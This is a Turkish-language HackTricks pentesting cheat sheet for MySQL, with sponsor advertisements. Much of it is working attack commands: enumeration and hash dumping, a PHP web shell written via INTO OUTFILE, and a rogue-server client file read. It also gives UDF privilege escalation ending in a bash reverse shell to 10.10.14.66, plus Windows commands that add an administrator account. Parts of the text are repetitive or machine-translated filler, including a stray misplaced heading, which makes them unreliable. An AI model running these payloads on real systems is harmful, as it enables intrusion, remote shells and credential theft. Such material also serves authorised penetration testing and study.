# 3306 - Mysql Pentesting

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) İspanya'da en önemli siber güvenlik etkinliği ve Avrupa'nın en önemlilerinden biridir. Teknik bilginin teşvik edilmesi misyonuyla, bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## **Temel Bilgiler**

**MySQL**, ücretsiz olarak kullanılabilen açık kaynaklı bir **İlişkisel Veritabanı Yönetim Sistemi (RDBMS)** olarak tanımlanabilir. **Yapılandırılmış Sorgu Dili (SQL)** üzerinde çalışır ve veritabanlarının yönetimini ve manipülasyonunu sağlar.

**Varsayılan port:** 3306
```
3306/tcp open  mysql
```
## **Bağlantı**

### **Yerel**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### Uzaktan

MySQL can be accessed remotely through the network. This allows attackers to exploit vulnerabilities in the MySQL server and gain unauthorized access to the database.

MySQL ağ üzerinden uzaktan erişilebilir. Bu, saldırganların MySQL sunucusundaki güvenlik açıklarını sömürerek veritabanına izinsiz erişim sağlamasına olanak tanır.

To identify if remote access is enabled, you can check the MySQL server configuration file (my.cnf) for the bind-address parameter. If the bind-address is set to 0.0.0.0 or a specific IP address, remote access is enabled.

Uzaktan erişimin etkin olup olmadığını belirlemek için MySQL sunucusu yapılandırma dosyası (my.cnf) içinde bind-address parametresini kontrol edebilirsiniz. Eğer bind-address 0.0.0.0 veya belirli bir IP adresine ayarlanmışsa, uzaktan erişim etkindir.

If remote access is enabled, an attacker can use tools like MySQL client or MySQL Workbench to connect to the MySQL server and perform various attacks.

Eğer uzaktan erişim etkinse, saldırganlar MySQL istemcisi veya MySQL Workbench gibi araçları kullanarak MySQL sunucusuna bağlanabilir ve çeşitli saldırılar gerçekleştirebilir.

To protect against remote attacks, it is recommended to disable remote access if it is not necessary. If remote access is required, it is important to secure the MySQL server by implementing strong authentication mechanisms, using secure connections (SSL/TLS), and regularly updating the MySQL server to patch any known vulnerabilities.

Uzaktan saldırılara karşı korunmak için, gereksizse uzaktan erişimi devre dışı bırakmanız önerilir. Uzaktan erişim gerekiyorsa, MySQL sunucusunu güvence altına almak için güçlü kimlik doğrulama mekanizmaları uygulamak, güvenli bağlantılar (SSL/TLS) kullanmak ve bilinen herhangi bir güvenlik açığını düzeltmek için düzenli olarak MySQL sunucusunu güncellemek önemlidir.
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## Harici Numaralandırma

Numaralandırma işlemlerinin bazıları geçerli kimlik bilgileri gerektirir.
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#mysql)

### Herhangi bir ikili veri yazın
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL komutları**
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQL İzinlerinin Sorgulanması

MySQL veritabanı sunucusunda, bir kullanıcının hangi izinlere sahip olduğunu belirlemek önemlidir. İzinlerin doğru bir şekilde yapılandırılmaması, güvenlik açıklarına yol açabilir. Bu bölümde, MySQL izinlerini sorgulamak için kullanılan bazı teknikler açıklanmaktadır.

#### 1. SHOW GRANTS Komutu

SHOW GRANTS komutu, bir kullanıcının sahip olduğu izinleri görüntülemek için kullanılır. Aşağıdaki komutu kullanarak, belirli bir kullanıcının izinlerini sorgulayabilirsiniz:

```sql
SHOW GRANTS FOR 'kullanici_adi'@'localhost';
```

#### 2. INFORMATION_SCHEMA Kullanma

INFORMATION_SCHEMA veritabanı, MySQL sunucusunda bulunan veritabanları, tablolar ve sütunlar hakkında bilgi sağlar. İzinleri sorgulamak için aşağıdaki sorguyu kullanabilirsiniz:

```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%kullanici_adi%';
```

#### 3. mysql.user Tablosunu Sorgulama

mysql.user tablosu, MySQL sunucusunda bulunan kullanıcıların ve izinlerinin bilgilerini içerir. Aşağıdaki sorguyu kullanarak, belirli bir kullanıcının izinlerini sorgulayabilirsiniz:

```sql
SELECT * FROM mysql.user WHERE user = 'kullanici_adi';
```

#### 4. SHOW VARIABLES Komutu

SHOW VARIABLES komutu, MySQL sunucusunun yapılandırma değişkenlerini görüntülemek için kullanılır. İzinlerle ilgili bazı değişkenleri sorgulamak için aşağıdaki komutu kullanabilirsiniz:

```sql
SHOW VARIABLES LIKE 'secure%';
```

Bu teknikler, MySQL izinlerini sorgulamak için kullanılan yaygın yöntemlerdir. İzinlerin doğru bir şekilde yapılandırıldığından emin olmak, güvenli bir MySQL sunucusu sağlamak için önemlidir.
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
Belgelere bakabilirsiniz, her bir ayrıcalığın anlamı için: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQL Dosya RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## MySQL istemci tarafından keyfi dosya okuma

Aslında, bir tabloya yerel olarak veri yüklemeyi denediğinizde, MySQL veya MariaDB sunucusu **istemciden dosyanın içeriğini okumasını** ve içeriği göndermesini ister. **Sonra, bir mysql istemcisini kendi MySQL sunucunuza bağlamayı başarabilirseniz, keyfi dosyaları okuyabilirsiniz.**\
Lütfen bunun kullanılan davranış olduğunu unutmayın:
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(Not: "yerel" kelimesine dikkat edin)\
Çünkü "yerel" olmadan şunları elde edebilirsiniz:
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**İlk PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**Bu makalede saldırının tam bir açıklamasını ve hatta RCE'ye nasıl genişletileceğini görebilirsiniz:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**Saldırının bir genel bakışını burada bulabilirsiniz:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/), **İspanya**'daki en önemli siber güvenlik etkinliklerinden biri ve **Avrupa**'daki en önemli etkinliklerden biridir. **Teknik bilginin yayılmasını amaçlayan** bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql Kullanıcısı

Eğer mysql **root** olarak çalışıyorsa, çok ilginç olur.
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### Tehlikeli mysqld.cnf Ayarları

MySQL hizmetinin yapılandırmasında, işletim ve güvenlik önlemlerini tanımlamak için çeşitli ayarlar kullanılır:

- **`user`** ayarı, MySQL hizmetinin hangi kullanıcı altında çalışacağını belirlemek için kullanılır.
- **`password`** MySQL kullanıcısıyla ilişkilendirilen şifreyi belirlemek için kullanılır.
- **`admin_address`** yönetim ağı arabiriminde TCP/IP bağlantıları için dinleyen IP adresini belirtir.
- **`debug`** değişkeni, günlüklerde hassas bilgileri içeren mevcut hata ayıklama yapılandırmalarını gösterir.
- **`sql_warnings`** uyarılar ortaya çıktığında tek satırlık INSERT ifadeleri için bilgi dizelerinin oluşturulup oluşturulmayacağını yönetir ve günlüklerde hassas verileri içerir.
- **`secure_file_priv`** ile veri içe ve dışa aktarma işlemlerinin kapsamı sınırlanarak güvenlik artırılır.


### Yetki Yükseltme
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### Kütüphane aracılığıyla Yetki Yükseltme

Eğer **mysql sunucusu root** (veya daha yetkili bir kullanıcı) olarak çalışıyorsa, komutları çalıştırmasını sağlayabilirsiniz. Bunun için **kullanıcı tanımlı fonksiyonlar** kullanmanız gerekmektedir. Ve bir kullanıcı tanımlı fonksiyon oluşturmak için mysql'in çalıştığı işletim sistemi için bir **kütüphane**'ye ihtiyacınız vardır.

Kötü niyetli kütüphaneyi kullanmak için sqlmap içinde ve metasploit içinde **`locate "*lib_mysqludf_sys*"`** komutunu kullanarak bulabilirsiniz. **`.so`** dosyaları **linux** kütüphaneleridir ve **`.dll`** dosyaları ise **Windows** için olanlardır, ihtiyacınıza göre birini seçin.

Eğer bu kütüphanelere **sahip değilseniz**, ya **onları arayın**, ya da bu [**linux C kodunu**](https://www.exploit-db.com/exploits/1518) indirin ve **linux üzerindeki zafiyetli makineye derleyin**:
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Şimdi kütüphaneye sahip olduğunuza göre, bir ayrıcalıklı kullanıcı (root?) olarak Mysql'e giriş yapın ve aşağıdaki adımları izleyin:

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### Windows

Windows işletim sistemi, MySQL sunucusunu barındıran birçok ortamda kullanılmaktadır. Bu bölümde, Windows üzerinde MySQL sunucusunu hedef alan bazı yaygın saldırı tekniklerini ele alacağız.

##### MySQL Servisini Algılama

MySQL servisini hedef almadan önce, hedef sistemin MySQL sunucusunu çalıştırıp çalıştırmadığını doğrulamak önemlidir. Bunun için aşağıdaki adımları izleyebilirsiniz:

1. `netstat -ano` komutunu kullanarak açık TCP bağlantılarını kontrol edin.
2. MySQL sunucusunun varsayılan olarak 3306 numaralı portu kullandığını unutmayın.
3. MySQL sunucusunun çalıştığına dair bir işlem bulunamazsa, hedef sistemin MySQL sunucusunu çalıştırmadığı sonucuna varabilirsiniz.

##### MySQL Kullanıcıları ve Veritabanları

MySQL sunucusuna erişmek için kullanıcı adı ve şifre gereklidir. Bu nedenle, hedef sistemin MySQL kullanıcılarını ve veritabanlarını belirlemek önemlidir. Bunun için aşağıdaki adımları izleyebilirsiniz:

1. `mysql -u root -p` komutunu kullanarak MySQL sunucusuna root kullanıcısıyla bağlanın.
2. `SHOW DATABASES;` komutunu kullanarak mevcut veritabanlarını listeleyin.
3. `SELECT User FROM mysql.user;` komutunu kullanarak mevcut kullanıcıları listeleyin.

##### MySQL Sürüm Bilgisi

MySQL sürüm bilgisi, saldırganlar için önemli bir bilgidir çünkü bu bilgi, saldırı vektörlerini belirlemelerine yardımcı olabilir. MySQL sürüm bilgisini elde etmek için aşağıdaki adımları izleyebilirsiniz:

1. `mysql -u root -p` komutunu kullanarak MySQL sunucusuna root kullanıcısıyla bağlanın.
2. `SELECT VERSION();` komutunu kullanarak MySQL sürüm bilgisini alın.

##### MySQL Sunucusuna Saldırı

MySQL sunucusuna saldırmak için çeşitli teknikler kullanılabilir. Bunlardan bazıları şunlardır:

1. Brute force saldırıları: Kaba kuvvet saldırıları, farklı kullanıcı adı ve şifre kombinasyonlarını deneyerek MySQL sunucusuna erişmeye çalışır.
2. SQL enjeksiyonu: SQL enjeksiyonu, kullanıcı girişlerini manipüle ederek MySQL sunucusuna zararlı SQL kodu enjekte etmeyi amaçlar.
3. Veritabanı keşfi: Veritabanı keşfi, hedef sistemin veritabanı yapısını ve içeriğini keşfetmeyi amaçlar. Bu bilgi, saldırganlara hedef sistemi daha iyi anlama ve zayıf noktaları belirleme imkanı sağlar.

##### MySQL Sunucusunu Sızma

MySQL sunucusunu sızmak için aşağıdaki teknikleri kullanabilirsiniz:

1. Zayıf şifreler: MySQL sunucusuna erişmek için kullanılan zayıf şifreleri deneyerek sızma girişiminde bulunabilirsiniz.
2. Güvenlik açıkları: MySQL sunucusunda bulunan güvenlik açıklarını kullanarak sızma girişiminde bulunabilirsiniz. Bu açıklar, saldırganlara yetkisiz erişim sağlama veya hedef sistemi ele geçirme imkanı verebilir.
3. Privilege escalation: MySQL sunucusunda daha yüksek bir kullanıcı düzeyine erişmek için ayrıcalık yükseltme tekniklerini kullanabilirsiniz. Bu, saldırganlara daha fazla yetki ve kontrol sağlar.

##### MySQL Veritabanı Keşfi

MySQL veritabanı keşfi, hedef sistemin veritabanı yapısını ve içeriğini keşfetmeyi amaçlar. Bu bilgi, saldırganlara hedef sistemi daha iyi anlama ve zayıf noktaları belirleme imkanı sağlar. MySQL veritabanı keşfi için aşağıdaki adımları izleyebilirsiniz:

1. `mysql -u root -p` komutunu kullanarak MySQL sunucusuna root kullanıcısıyla bağlanın.
2. `SHOW DATABASES;` komutunu kullanarak mevcut veritabanlarını listeleyin.
3. `USE <database_name>;` komutunu kullanarak belirli bir veritabanına geçin.
4. `SHOW TABLES;` komutunu kullanarak mevcut tabloları listeleyin.
5. `DESCRIBE <table_name>;` komutunu kullanarak belirli bir tablonun sütunlarını listeleyin.

##### MySQL Veritabanı Yedekleme ve Geri Yükleme

MySQL veritabanı yedekleme ve geri yükleme işlemleri, veri kaybını önlemek ve veritabanını korumak için önemlidir. MySQL veritabanını yedeklemek ve geri yüklemek için aşağıdaki adımları izleyebilirsiniz:

1. Veritabanını yedekleme:
   - `mysqldump -u <username> -p <database_name> > backup.sql` komutunu kullanarak veritabanını yedekleyin.
2. Veritabanını geri yükleme:
   - `mysql -u <username> -p <database_name> < backup.sql` komutunu kullanarak yedeklenen veritabanını geri yükleyin.

##### MySQL Sunucusunu Güncelleme

MySQL sunucusunu güncellemek, güvenlik açıklarını kapatmak ve yeni özelliklere erişmek için önemlidir. MySQL sunucusunu güncellemek için aşağıdaki adımları izleyebilirsiniz:

1. MySQL sunucusunun mevcut sürümünü belirleyin.
2. MySQL sunucusunun en son sürümünü indirin.
3. Mevcut MySQL sunucusunu kapatın.
4. Yeni MySQL sunucusunu yükleyin ve yapılandırın.
5. Veritabanlarını ve kullanıcıları geri yükleyin.
6. MySQL sunucusunu yeniden başlatın.

##### MySQL Sunucusunu İzleme

MySQL sunucusunu izlemek, performans sorunlarını tespit etmek ve sunucunun sağlığını kontrol etmek için önemlidir. MySQL sunucusunu izlemek için aşağıdaki adımları izleyebilirsiniz:

1. MySQL sunucusuna bağlanın.
2. `SHOW STATUS;` komutunu kullanarak MySQL sunucusunun durumunu kontrol edin.
3. `SHOW PROCESSLIST;` komutunu kullanarak mevcut MySQL işlemlerini kontrol edin.
4. Performans sorunları tespit etmek için MySQL sunucusunun log dosyalarını kontrol edin.

##### MySQL Sunucusunu Güvenli Hale Getirme

MySQL sunucusunu güvenli hale getirmek, yetkisiz erişimi önlemek ve verileri korumak için önemlidir. MySQL sunucusunu güvenli hale getirmek için aşağıdaki adımları izleyebilirsiniz:

1. Güçlü şifreler kullanın ve düzenli olarak şifreleri değiştirin.
2. Yetkisiz erişimi önlemek için gereksiz kullanıcı hesaplarını kaldırın.
3. Güvenlik duvarı kullanarak MySQL sunucusuna erişimi sınırlayın.
4. Veritabanı ve tablo izinlerini düzgün bir şekilde yapılandırın.
5. Güvenlik açıklarını düzeltmek için düzenli olarak MySQL sunucusunu güncelleyin.
6. Veritabanı yedeklemeleri yaparak veri kaybını önleyin.
7. MySQL sunucusunun loglarını düzenli olarak kontrol edin ve izleme yapın.

Bu teknikler, Windows üzerinde MySQL sunucusunu hedef alan saldırıları gerçekleştirmek ve MySQL sunucusunu güvenli hale getirmek için kullanılabilir. Ancak, herhangi bir saldırı veya güvenlik önlemi gerçekleştirirken yasalara ve etik kurallara uymak önemlidir.
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### Dosyalardan MySQL kimlik bilgilerini çıkarma

_/etc/mysql/debian.cnf_ içinde **debian-sys-maint** kullanıcısının **düz metin şifresini** bulabilirsiniz.
```bash
cat /etc/mysql/debian.cnf
```
Aşağıdaki kimlik bilgilerini kullanarak mysql veritabanına giriş yapabilirsiniz.

Dosyanın içinde: _/var/lib/mysql/mysql/user.MYD_ **MySQL kullanıcılarının tüm hash'lerini** bulabilirsiniz (veritabanı içindeki mysql.user'dan çıkarabileceğiniz hash'ler).

Onları çıkarmak için şunu yapabilirsiniz:
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### Günlüğü etkinleştirme

Mysql sorgularının günlüğünü `/etc/mysql/my.cnf` dosyasının aşağıdaki satırlarını yorum satırından çıkararak etkinleştirebilirsiniz:

![](<../.gitbook/assets/image (277).png>)

### Faydalı dosyalar

Yapılandırma Dosyaları

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* Komut Geçmişi
* \~/.mysql.history
* Günlük Dosyaları
* connections.log
* update.log
* common.log

## Varsayılan MySQL Veritabanı/Tabloları

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait
# MySQL Pentest Komutları

## Veritabanı İstatistikleri

- `schema_table_statistics`: Şema ve tablo istatistikleri
- `schema_table_statistics_with_buffer`: Tampon ile şema ve tablo istatistikleri
- `schema_tables_with_full_table_scans`: Tam tablo taramaları ile şema ve tablolar
- `schema_unused_indexes`: Kullanılmayan indeksler
- `session`: Oturum bilgileri
- `session_ssl_status`: SSL durumu
- `statement_analysis`: İfadelerin analizi
- `statements_with_errors_or_warnings`: Hatalı veya uyarılı ifadeler
- `statements_with_full_table_scans`: Tam tablo taramaları ile ifadeler
- `statements_with_runtimes_in_95th_percentile`: İfadelerin 95. yüzdelik dilimde çalışma süreleri
- `statements_with_sorting`: Sıralama içeren ifadeler
- `statements_with_temp_tables`: Geçici tablolar içeren ifadeler
- `sys_config`: Sistem yapılandırma bilgileri
- `user_summary`: Kullanıcı özetleri
- `user_summary_by_file_io`: Dosya G/Ç türüne göre kullanıcı özetleri
- `user_summary_by_file_io_type`: Dosya G/Ç türüne göre kullanıcı özetleri
- `user_summary_by_stages`: Aşama türüne göre kullanıcı özetleri
